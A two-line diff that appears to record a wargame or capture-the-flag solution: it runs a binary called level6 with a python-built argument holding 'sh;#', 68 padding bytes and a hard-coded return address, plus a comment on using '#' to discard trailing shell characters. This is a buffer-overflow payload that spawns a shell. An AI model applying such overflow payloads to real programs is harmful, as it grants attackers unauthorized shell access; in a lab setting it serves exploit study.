@@ -1,0 +1,2 @@
+./level6 `python -c 'print "sh;#" + "A"*68 + "\x60\xb0\xe6\xb7"'`
+(# to ignore rest of the command in case of illegal shell characters like ";;" or "`" unclosed)
